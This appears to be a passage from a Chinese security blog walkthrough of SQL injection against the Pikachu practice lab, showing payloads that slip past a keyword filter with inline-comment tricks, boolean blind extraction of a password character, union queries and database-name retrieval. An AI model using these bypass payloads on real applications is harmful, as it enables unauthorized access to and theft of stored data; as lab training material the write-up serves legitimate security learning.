<h2 id="4-SQL注入绕过小实战"><a href="#4-SQL注入绕过小实战" class="headerlink" title="4 SQL注入绕过小实战"></a>4 SQL注入绕过小实战</h2><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'</span></span><br><span class="line"><span class="string"># You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''vince'''</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>可以看见是存在sql注入的</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'and+1=1--+</span></span><br></pre></td></tr></tbody></table></figure>

<img src="/posts/31899/image-20250319223257723.png" class="" title="image-20250319223257723">

<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'and+0x2!=1--+</span></span><br><span class="line"><span class="string"># your uid:1</span></span><br><span class="line"><span class="string">your email is: vince@pikachu.com</span></span><br></pre></td></tr></tbody></table></figure>

<p>成功绕过</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'and+substr(user()+from+1+for+1)--+</span></span><br></pre></td></tr></tbody></table></figure>

<p>被拦截，尝试使用布尔绕过</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=vince<span class="string">'and+0x31!=if((substr((select+password+from+`users`+limit+1)from+1+for+1)='</span>a<span class="string">'),0x31,0)--+  # 回显</span></span><br><span class="line"><span class="string">?name=vince'</span>and+0x31!=<span class="keyword">if</span>((substr((select+password+from+`users`+limit+<span class="number">1</span>)from+<span class="number">1</span>+for+<span class="number">1</span>)='e'),<span class="number">0</span>x31,<span class="number">0</span>)--+  # 不回显</span><br></pre></td></tr></tbody></table></figure>

<p>尝试联合注入</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'order+by+1--+ # 被拦截</span></span><br><span class="line"><span class="string">?name=vince'</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="operator">+</span><span class="number">1</span><span class="comment">--+ # 被拦截</span></span><br><span class="line">?name<span class="operator">=</span>vince<span class="string">'order/*//*/by+1--+  # 成功绕过</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?name=vince'</span><span class="keyword">order</span><span class="comment">/*//*/</span><span class="keyword">by</span><span class="operator">+</span><span class="number">2</span><span class="comment">--+	# 回显</span></span><br><span class="line">?name<span class="operator">=</span>vince<span class="string">'order/*//*/by+3--+	# 无回显</span></span><br></pre></td></tr></tbody></table></figure>

<p>因此这里只有两个字段</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'union+select+1,2--+	# 被拦截</span></span><br><span class="line"><span class="string">?name=vince'</span><span class="keyword">union</span><span class="comment">/*//*/</span><span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span><span class="comment">--+	# 被拦截</span></span><br><span class="line">?name<span class="operator">=</span>vince<span class="string">'union/*////*/select+1,2--+	# 被拦截</span></span><br><span class="line"><span class="string">?name=vince'</span><span class="keyword">union</span><span class="comment">/*//--+//*/</span><span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span><span class="comment">--+	# 成功绕过</span></span><br></pre></td></tr></tbody></table></figure>

<p>查数据库名</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'union/*//--+//*/select+1,(select+concat(schema_name)+from+information_schema.schemata)--+	# 被拦截</span></span><br><span class="line"><span class="string">?name=vince'</span><span class="keyword">union</span><span class="comment">/*//--+//*/</span><span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,(database<span class="comment">/*//--+//*/</span>())<span class="comment">--+	# 成功绕过</span></span><br><span class="line"># myp1</span><br></pre></td></tr></tbody></table></figure>

<p>查表名</p>
<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name<span class="operator">=</span>vince<span class="string">'union/*//--+//*/select+1,(select+concat(table_name)+from+information_schema.tables+where+table_schema=`myp1`)--+	# 被拦截</span></span><br></pre></td></tr></tbody></table></figure>

<p>经过测试过滤了<code>information_schema</code>，尝试使用<code>sys.schema_auto_increment_columns</code>、<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_table_index</code>都绕过无果。（其实绕过了，但是查询权限不足<code>﻿SELECT command denied to user 'myp1'@'localhost' for table 'x$schema_table_statistics_with_buffer'</code>）</p>
<p>尝试双写和编码都绕过了，也没权限，应该确实没办法了</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
          </div>

        

    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">squar3c</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">90k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">2:43</span>
  </span>
</div>
  <div class="powered-by">
    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
  </div>

<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("03/03/2025 10:00:00"); //此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒.";
    }
setInterval("createtime()",250);
</script>
    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.1/dist/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  




<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>

<script>
var options = {
  bottom: '64px',
  right: '32px',
  left: '',
  time: '0.5s',
  mixColor: 'transparent',
  backgroundColor: 'transparent',
  buttonColorDark: '#100f2c',
  buttonColorLight: '#fff',
  saveInCookies: false,
  label: ' ',
  autoMatchOsTheme: false
}
const darkmode = new Darkmode(options);
window.darkmode = darkmode;
darkmode.showWidget();
if (window.darkmode && !window.darkmode.isActivated()) {
  window.darkmode.toggle();
  var toggleButtons = document.getElementsByClassName("darkmode-toggle");
  if (toggleButtons && toggleButtons.length > 0) {
    for (i = 0; i < toggleButtons.length; i++) {
      toggleButtons[i].classList.add("darkmode-toggle--white");
    }
  }
}
</script>

</body>
</html>
